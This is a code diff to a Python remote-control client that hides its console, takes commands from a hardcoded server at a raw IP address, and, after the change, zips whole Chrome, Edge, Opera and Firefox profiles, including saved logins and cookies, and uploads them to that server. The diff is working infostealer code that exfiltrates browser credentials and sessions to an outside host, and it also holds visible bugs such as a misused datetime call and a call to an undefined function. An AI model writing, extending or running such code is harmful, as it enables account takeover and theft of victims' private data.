@@ -31,6 +31,7 @@ from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 import pyperclip
 from pynput import mouse
 import pythoncom
+import datetime
 SERVER_URL = "http://193.124.121.76:4443"
 
 def hide_console():
@@ -103,7 +104,7 @@ class PCClient:
                 time.sleep(30)
                 
         return False
-    
+
     def upload_large_file(self, file_path, file_type='file'):
         try:
             # Читаем файл чанками
@@ -194,8 +195,8 @@ class PCClient:
     def get_browser_data(self, browser):
         try:
             browser_paths = {
-                'chrome': os.path.join(os.getenv('LOCALAPPDATA'), r'Google\Chrome\User Data'),
-                'edge': os.path.join(os.getenv('LOCALAPPDATA'), r'Microsoft\Edge\User Data'),
+                'chrome': os.path.join(os.getenv('LOCALAPPDATA'), r'Google\Chrome\User Data\Default'),
+                'edge': os.path.join(os.getenv('LOCALAPPDATA'), r'Microsoft\Edge\User Data\Default'),
                 'opera': os.path.join(os.getenv('APPDATA'), r'Opera Software\Opera Stable'),
                 'firefox': os.path.join(os.getenv('APPDATA'), r'Mozilla\Firefox\Profiles')
             }
@@ -207,35 +208,46 @@ class PCClient:
             if not os.path.exists(path):
                 return f"Путь к данным браузера не найден: {path}", None, None
             
-            # Ищем важные файлы
-            important_files = []
-            for root, dirs, files in os.walk(path):
-                for file in files:
-                    if file.lower() in ['login data', 'cookies', 'history', 'web data', 'bookmarks', 'preferences']:
-                        important_files.append(os.path.join(root, file))
-            
-            if not important_files:
-                return f"Не найдены важные файлы для браузера {browser}", None, None
-            
             # Создаем временный архив
             import tempfile
             temp_dir = tempfile.mkdtemp()
-            zip_path = os.path.join(temp_dir, f"{browser}_data.zip")
+            zip_name = f"{browser}_profile_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
+            zip_path = os.path.join(temp_dir, zip_name)
             
+            # Создаем архив с полным профилем
             with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
-                for file in important_files:
-                    try:
-                        zipf.write(file, os.path.basename(file))
-                    except Exception as e:
-                        print(f"Ошибка добавления файла {file} в архив: {e}")
+                count = 0
+                for root, dirs, files in os.walk(path):
+                    # Пропускаем кэш для уменьшения размера
+                    if 'Cache' in dirs:
+                        dirs.remove('Cache')
+                    if 'GPUCache' in dirs:
+                        dirs.remove('GPUCache')
+                    
+                    for file in files:
+                        try:
+                            full_path = os.path.join(root, file)
+                            if os.path.getsize(full_path) > 100 * 1024 * 1024:  # Пропускаем >100MB
+                                continue
+                            arcname = os.path.relpath(full_path, os.path.dirname(path))
+                            zipf.write(full_path, arcname)
+                            count += 1
+                        except Exception as e:
+                            continue
             
-            with open(zip_path, "rb") as f:
-                file_data = base64.b64encode(f.read()).decode('utf-8')
+            # Загружаем на сервер
+            download_url, msg = self.upload_large_file(zip_path)
             
             # Удаляем временные файлы
             shutil.rmtree(temp_dir)
             
-            return f"Данные браузера {browser} собраны", file_data, 'file'
+            if download_url:
+                file_size = os.path.getsize(zip_path) // (1024 * 1024)  # в MB
+                return (f"✅ Профиль {browser} готов к скачиванию\n"
+                       f"📦 Размер архива: {file_size} MB"), download_url, 'url'
+            else:
+                return msg, None, None
+                
         except Exception as e:
             return f"Ошибка получения данных браузера: {str(e)}", None, None
     def send_heartbeat(self):
@@ -601,6 +613,10 @@ class PCClient:
             elif cmd.startswith('browser:'):
                 browser = cmd[len('browser:'):].strip().lower()
                 result, file_data, file_type = self.get_browser_data(browser)
+            elif cmd.startswith('browser_full:'):
+                browser = cmd[len('browser_full:'):].strip().lower()
+                result, file_data, file_type = self.get_browser_data_full(browser)
+                self.send_command_result(command['id'], result, file_data, file_type)
             self.send_command_result(command['id'], result, file_data, file_type)
         except Exception as e:
             print(f"Ошибка выполнения команды: {e}")
